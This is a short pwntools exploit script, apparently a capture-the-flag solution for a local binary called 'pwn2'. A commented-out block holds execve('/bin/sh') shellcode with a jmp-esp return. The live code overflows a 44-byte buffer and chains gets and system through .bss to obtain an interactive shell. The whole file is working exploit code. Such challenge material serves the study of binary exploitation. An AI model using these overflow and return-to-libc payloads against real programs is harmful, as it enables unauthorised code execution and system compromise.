from pwn import *

e = ELF('./pwn2')
p = process('./pwn2')

'''
#shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
jmp_esp_addr = 0x08048544

payload = shellcode
payload += 'A'*(44-len(payload))
payload += p32(jmp_esp_addr) # stack top address or buffer address

print p.recvuntil('$ ')
p.sendline(payload)
p.interactive()
'''

bss_addr = e.bss()
print "bss: " + hex(bss_addr)
gets_addr = e.symbols['gets']
system_addr = e.symbols['system']

payload = 'A'*44
payload += p32(gets_addr)
payload += p32(system_addr)
payload += p32(bss_addr)
payload += p32(bss_addr)

p.sendline(payload)
p.interactive()